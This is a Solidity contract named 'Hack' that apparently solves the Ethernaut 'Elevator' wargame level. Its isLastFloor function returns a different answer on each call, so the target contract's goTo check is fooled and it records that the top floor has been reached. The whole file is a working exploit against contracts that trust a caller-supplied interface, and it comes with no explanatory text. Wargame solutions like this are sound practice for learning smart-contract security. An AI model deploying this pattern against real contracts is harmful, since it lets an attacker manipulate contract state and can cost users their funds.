// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

interface Elevator {
    function goTo(uint _floor) external;
}


contract Hack {
    bool result = true;
    


    function isLastFloor(uint) public returns (bool){
     
       if(result == true)
    {
      
      result = false;
    }
    else {
   
      result = true;
    }
    return result;
    }

    function Goto(address _instanceAddr) public {
       Elevator elevator = Elevator(_instanceAddr);
        elevator.goTo(9);
    }
} 